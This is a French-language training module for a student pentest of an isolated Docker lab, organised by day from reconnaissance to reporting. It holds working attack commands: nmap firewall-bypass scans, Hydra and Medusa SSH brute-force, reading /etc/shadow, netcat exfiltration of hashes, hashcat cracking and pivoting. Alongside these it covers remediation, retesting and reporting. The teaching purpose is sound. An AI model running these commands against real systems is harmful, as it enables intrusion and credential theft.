# 📘 PHASE 3 — Pentest & Audit de Sécurité (Jours 31-45)

> **Objectif** : Adopter le rôle d'attaquant pour évaluer la robustesse de l'infrastructure. Conduire un pentest structuré (méthodologie PTES), exploiter, remédier, produire un rapport.

> **Positionnement** : ce document sert de guide de campagne a partir d'un socle reseau deja valide. Il structure les scenarios de test offensif et les actions de remediation a mener autour du lab en service.

## ⚠️ Cadre légal

🛡 **Toutes les attaques sont menées exclusivement sur le lab Docker isolé.**  
🛡 **Aucun test ne doit cibler des systèmes externes ou tiers.**  
🛡 **Faire signer un formulaire d'autorisation avant le démarrage.**

---

## 🗓️ Semaine 7 — Méthodologie & Reconnaissance (J31-J35)

### Jour 31 — Méthodologie pentest

**Phases standard PTES** :
1. **Pre-engagement** : périmètre, règles d'engagement, contrats
2. **Intelligence Gathering** : OSINT, reconnaissance passive
3. **Threat Modeling** : identification des actifs critiques
4. **Vulnerability Analysis** : scan, énumération
5. **Exploitation** : exploitation contrôlée
6. **Post-Exploitation** : escalade, latéralisation, persistance
7. **Reporting** : rapport executive + technique

**Périmètre du lab** :
| Cible | IP | Description |
|---|---|---|
| FW_ISP (mgmt) | 192.168.99.1 | Firewall central |
| FW_CLIENT (LAN) | 192.168.10.1 | Firewall client |
| FW_CLIENT (mgmt) | 192.168.99.10 | Admin FW_CLIENT |
| FW_SERVER | 192.168.20.1 | Firewall serveur (via VPN) |
| WebServer | 192.168.20.10 | Serveur web (HTTP, port 80) |
| SSHServer | 192.168.20.11 | Serveur SSH (port 22) |

**Position de l'attaquant** : conteneur `kali` dans le LAN_CLIENT (192.168.10.50) = simulation d'un insider menacé.

```bash
docker exec -it kali bash
ip addr show
ip route
```

---

### Jour 32 — Reconnaissance active

```bash
docker exec -it kali bash

# === 1. Découverte d'hôtes (host discovery) ===
# Sur le LAN local (LAN_CLIENT)
nmap -sn 192.168.10.0/24 -oN /tmp/recon_lan_users.txt

# Sur le réseau de management (à priori inaccessible)
nmap -sn 192.168.99.0/24 -oN /tmp/recon_mgmt.txt

# Sur le LAN_SERVER (via VPN)
nmap -sn 192.168.20.0/24 -oN /tmp/recon_lan_servers.txt

# === 2. Scan complet de la passerelle ===
nmap -sS -sV -sC -O -p- 192.168.10.1 -oN /tmp/scan_fwclient.txt

# === 3. Scan rapide du LAN_SERVER ===
nmap -sS -sV --top-ports 1000 192.168.20.0/24 -oN /tmp/scan_servers.txt

# === 4. Scan UDP (services courants) ===
nmap -sU --top-ports 100 192.168.20.0/24 -oN /tmp/scan_udp.txt
```

**Résultats attendus** :
- 192.168.20.10 : ouvert TCP/80 (nginx), TCP/22 (OpenSSH)
- 192.168.20.11 : ouvert TCP/22 (OpenSSH), peut-être TCP/80
- FW_CLIENT côté LAN : peut-être TCP/3128 (Squid proxy), UDP/53 (DNS), UDP/67 (DHCP)
- FW_SERVER : UDP/123 (NTP) si scan permet

**Livrable J32** : tableau récapitulatif des hôtes/ports/services.

---

### Jour 33 — Énumération des services

```bash
# === Énumération HTTP ===
nmap --script=http-enum,http-headers,http-methods -p 80,443 192.168.20.10
nikto -h http://192.168.20.10 -o /tmp/nikto_web.txt

# Inspection manuelle
curl -v http://192.168.20.10/
curl -I http://192.168.20.10/

# === Énumération SSH ===
nmap --script=ssh-auth-methods,ssh2-enum-algos -p 22 192.168.20.11

# Banner SSH
nc -nv 192.168.20.11 22

# === Énumération DNS ===
dig @192.168.99.1 labcyber.local AXFR             # zone transfer
dig @192.168.99.1 ANY labcyber.local
dnsenum 192.168.99.1
dnsrecon -d labcyber.local -n 192.168.99.1

# === Énumération NTP ===
ntpq -c "rv" 192.168.99.1
```

**Vulnérabilités à identifier** :
- ❗ HTTP server expose des informations dans le HTML (`<!-- TODO: app=v1.2.3, db=mysql-5.7 -->`)
- ❗ SSH version exposée → CVE potentielles
- ❗ Pas de fail2ban → brute-force possible
- ❗ Pas de chiffrement HTTP

---

### Jour 34 — Test des politiques firewall

```bash
# === Test ACK scan (détecte règles stateful) ===
nmap -sA -p- 192.168.20.10
# Résultats : "filtered" = stateful FW, "unfiltered" = règles laxistes

# === Tentative de bypass via fragmentation ===
nmap -f -p 22,80 192.168.20.10
nmap --mtu 16 -p 22,80 192.168.20.10

# === Source port spoofing (parfois bypass DNS/UDP) ===
nmap --source-port 53 -p- 192.168.20.10

# === hping3 pour tester les ACL ===
# Tentative d'envoyer un paquet TCP RST avec source UDP/53
hping3 -S -p 80 -s 53 192.168.20.10 -c 3

# === Test idle scan (zombie) ===
# Identifier un hôte avec IPID prédictible
nmap -p 80 -O 192.168.20.10
```

---

### Jour 35 — Vulnérabilités VPN et services réseau

```bash
# === IKE-SCAN sur le tunnel VPN ===
# (Note: depuis Kali on n'atteint pas directement le WAN, 
#  mais on peut le faire depuis FW_CLIENT lui-même)

docker exec -it fw-client bash
apt install -y ike-scan
ike-scan -M -A 10.20.0.2

# Résultats : algorithmes acceptés
# Si DH group faible (< 14) → vulnérable au brute-force des PSK

# === DNS amplification ===
# Test si le DNS répond aux requêtes externes
dig @192.168.99.1 . NS                  # Si répond, amplification possible
dig @192.168.99.1 ANY labcyber.local

# === DHCP starvation ===
# Outil : dhcpig (épuiser les IP dispos)
# apt install -y python3-scapy
# Script à écrire ou utiliser dhcpstarv
# Pour le lab, démontrer le concept seulement

# === Test NTP amplification ===
# Vérifier la commande "monlist"
ntpdc -c monlist 192.168.99.1     # Si répond, vulnérable
```

---

## 🗓️ Semaine 8 — Exploitation & Post-exploitation (J36-J40)

### Jour 36 — Exploitation

```bash
# === Recherche CVE pour les versions identifiées ===
searchsploit nginx 1.22
searchsploit openssh 9.2

# === Metasploit ===
msfconsole

# Scanner pour exploits
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.20.11
run

# Scanner pour vulnérabilités SMB (si SMB exposé)
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.20.0/24
run
```

---

### Jour 37 — Brute-force des credentials

```bash
# === Hydra contre SSHServer (vulnérabilité volontaire) ===

# Créer wordlists
cat > /tmp/users.txt <<EOF
admin
administrator
root
test
user
ubuntu
EOF

cat > /tmp/passwords.txt <<EOF
admin
admin123
password
123456
toor
test
qwerty
P@ssw0rd
labcyber
EOF

# Lancer le brute-force
hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 4 -V -f ssh://192.168.20.11

# Résultat attendu :
# [22][ssh] host: 192.168.20.11   login: admin   password: admin123
```

🎯 **Vulnérabilité confirmée** : compte admin avec mot de passe trivial.

```bash
# === Brute-force HTTP basic auth (si présent) ===
hydra -L /tmp/users.txt -P /tmp/passwords.txt 192.168.20.10 http-get /admin

# === Brute-force avec Medusa (alternative) ===
medusa -h 192.168.20.11 -U /tmp/users.txt -P /tmp/passwords.txt -M ssh -t 4
```

---

### Jour 38 — Post-exploitation

Après avoir compromis admin@sshserver :

```bash
# Connexion légitime (via le brute-force)
sshpass -p 'admin123' ssh -o StrictHostKeyChecking=no admin@192.168.20.11

# === Une fois sur le serveur, exfiltration de hash ===
sudo cat /etc/shadow > /tmp/hashes.txt   # si admin a sudo
# Sinon :
cat /etc/passwd

# === Exfiltrer vers Kali ===
# (depuis le sshserver, créer un canal de retour)
nc 192.168.10.50 4444 < /tmp/hashes.txt &

# Sur Kali, écouter
nc -lvnp 4444 > /tmp/hashes_recovered.txt

# === Crack offline avec hashcat ===
hashcat -m 1800 /tmp/hashes_recovered.txt /usr/share/wordlists/rockyou.txt

# === Tentative de pivot ===
# Depuis sshserver, scanner le management
ssh admin@192.168.20.11
nmap -sn 192.168.99.0/24
# Si on peut atteindre le management → pivoter vers les firewalls
```

---

### Jour 39 — Test de la détection

Maintenant, **vérifier ce que la défense a vu** :

```bash
# Sur l'hôte
docker logs fw-client 2>&1 | grep -i "drop\|attack\|brute"
docker exec fw-client cat /var/log/fw/startup.log

# Logs Squid
docker exec fw-client tail -50 /var/log/squid/access.log

# Logs sshserver (sshd)
docker exec sshserver journalctl -u ssh --no-pager 2>/dev/null || \
  docker exec sshserver tail -50 /var/log/auth.log

# Uptime Kuma a-t-il détecté quelque chose ?
# → Vérifier dashboard http://localhost:3001
```

**Identifier ce qui est passé sans trace** :
- ❗ Le scan Nmap depuis Kali a-t-il été journalisé ?
- ❗ Le brute-force SSH a-t-il généré des alertes ?
- ❗ Les tentatives de DNS zone transfer sont-elles loggées ?
- ❗ La latéralisation est-elle visible ?

**Recommandations à formuler** :
- Centraliser les logs (Phase 4 → SIEM)
- Activer fail2ban sur SSH
- Monitorer les tentatives `iptables LOG`
- Alerter sur les pics de connexions SSH

---

### Jour 40 — Rapport pentest v0.1

Structure du rapport (PDF, 20-30 pages) :

```markdown
# Rapport de Pentest - Lab Cyber 4ème SSI

## Résumé exécutif (1 page)
- Périmètre et durée
- Synthèse des risques (heatmap)
- Recommandations top 5

## Méthodologie (2 pages)
- PTES suivi
- Outils utilisés
- Cadre légal

## Findings (10-15 pages)
Pour chaque vulnérabilité :
| Champ | Détail |
|---|---|
| ID | VULN-001 |
| Titre | Mot de passe SSH trivial sur sshserver |
| Sévérité | CRITIQUE |
| CVSS | 9.8 |
| Description | ... |
| Preuve | screenshot + commande |
| Impact | Compromission complète |
| Recommandation | ... |
| Statut | À corriger |

## Plan de remédiation (2-3 pages)
## Annexes (logs, captures)
```

**Vulnérabilités attendues à documenter** :

| ID | Titre | CVSS | Sévérité |
|---|---|---|---|
| VULN-001 | Credentials par défaut SSH (admin/admin123) | 9.8 | Critique |
| VULN-002 | Login root SSH activé | 8.1 | Haut |
| VULN-003 | HTTP non chiffré | 5.3 | Moyen |
| VULN-004 | Pas de fail2ban | 6.5 | Moyen |
| VULN-005 | Information disclosure dans HTML | 4.3 | Faible |
| VULN-006 | DNS resolver ouvert (potentiel amplification) | 7.5 | Haut |
| VULN-007 | PSK IPsec stocké en clair dans configs | 6.0 | Moyen |
| VULN-008 | Algorithmes IPsec acceptés multiples (downgrade) | 5.0 | Moyen |
| VULN-009 | Pas de logging centralisé | 4.0 | Faible |
| VULN-010 | Comptes admin partagés (pas de traçabilité) | 5.5 | Moyen |

---

## 🗓️ Semaine 9 — Remédiation & Audit final (J41-J45)

### Jour 41 — Plan de remédiation

Priorisation matrix :

| Vulnérabilité | Effort | Impact | Priorité |
|---|---|---|---|
| VULN-001 (mdp SSH) | Faible | Critique | P0 - immédiat |
| VULN-002 (root SSH) | Faible | Haut | P0 - immédiat |
| VULN-007 (PSK) | Moyen | Moyen | P1 - 7 jours |
| VULN-006 (DNS open) | Faible | Haut | P1 - 7 jours |
| VULN-004 (fail2ban) | Moyen | Moyen | P1 - 7 jours |
| VULN-003 (HTTPS) | Élevé | Moyen | P2 - 30 jours |
| ... | ... | ... | ... |

---

### Jour 42-43 — Application des correctifs

#### Correctif VULN-001 et VULN-002 : SSH

```bash
docker exec sshserver bash

# 1. Mots de passe forts
passwd admin
# new password: strong-random-passphrase

# 2. Désactiver root login
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config

# 3. Désactiver password auth, passer en clé
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# 4. Limiter les utilisateurs SSH
echo "AllowUsers admin" >> /etc/ssh/sshd_config

# 5. Restart SSH
service ssh restart
```

#### Correctif VULN-004 : Fail2ban

```bash
docker exec sshserver apt install -y fail2ban

cat > /etc/fail2ban/jail.local <<EOF
[sshd]
enabled = true
maxretry = 3
findtime = 5m
bantime = 1h
EOF

service fail2ban restart
fail2ban-client status sshd
```

#### Correctif VULN-006 : DNS resolver fermé

Modifier `fw-isp/dnsmasq.conf` :
```
# Restreindre aux LANs internes uniquement
no-dhcp-interface=eth0
local-service                # rejette les requêtes externes
```

#### Correctif VULN-007 : PSK → certificats

Génération de certificats pour IPsec :
```bash
docker exec fw-server bash

# CA
ipsec pki --gen --type rsa --size 4096 --outform pem > /etc/ipsec.d/private/ca.pem
ipsec pki --self --ca --lifetime 3650 \
   --in /etc/ipsec.d/private/ca.pem \
   --dn "CN=LabCyber CA" \
   --outform pem > /etc/ipsec.d/cacerts/ca.pem

# Certificat serveur
ipsec pki --gen --type rsa --size 2048 --outform pem > /etc/ipsec.d/private/server.pem
ipsec pki --pub --in /etc/ipsec.d/private/server.pem | \
   ipsec pki --issue --lifetime 730 --cacert /etc/ipsec.d/cacerts/ca.pem \
   --cakey /etc/ipsec.d/private/ca.pem \
   --dn "CN=fw-server.labcyber.local" \
   --san "fw-server.labcyber.local" \
   --outform pem > /etc/ipsec.d/certs/server.pem
```

Modifier `ipsec.conf` :
```
authby=pubkey
leftcert=server.pem
leftid="CN=fw-server.labcyber.local"
```

---

### Jour 44 — Pentest de vérification (retesting)

Refaire les attaques principales pour vérifier la remédiation :

```bash
docker exec -it kali bash

# Test 1 : brute-force SSH (doit maintenant échouer)
hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 4 ssh://192.168.20.11
# Attendu : aucune réussite + après 3 tentatives, fail2ban bannit

# Test 2 : DNS open resolver (doit échouer depuis l'externe)
# Le simuler depuis FW_ISP eth0 :
docker exec fw-isp dig @192.168.99.1 google.com +short
# Doit échouer ou refused

# Test 3 : Root login SSH
ssh root@192.168.20.11
# "Permission denied"

# Vérifier les logs fail2ban
docker exec sshserver fail2ban-client status sshd
# Doit montrer des IPs bannies
```

**Documenter les nouvelles vulnérabilités** introduites par les correctifs (régression) — peu probable mais à vérifier.

---

### Jour 45 — Soutenance Phase 3

Format : 25 min présentation + 15 min questions techniques.

Plan :
1. (3 min) Méthodologie suivie
2. (5 min) Reconnaissance et mapping
3. (5 min) Top 5 vulnérabilités exploitées (démos)
4. (5 min) Plan de remédiation
5. (5 min) Pentest de vérification : avant/après
6. (2 min) Lessons learned

**Démo live à préparer** :
- Brute-force SSH **avant** correctif (succès)
- Mêmes commandes **après** correctif (échec + ban fail2ban)

---

## ✅ Validation Phase 3

| Critère | Validation |
|---|---|
| Recon complète | Tableau hôtes/ports/services |
| ≥ 10 vulnérabilités identifiées | Rapport documenté |
| Exploitation démontrée | Preuve brute-force SSH réussi |
| Plan de remédiation | Tableau priorisé |
| Correctifs appliqués | Retesting confirme l'efficacité |
| Rapport pro PDF | 20-30 pages, format pro |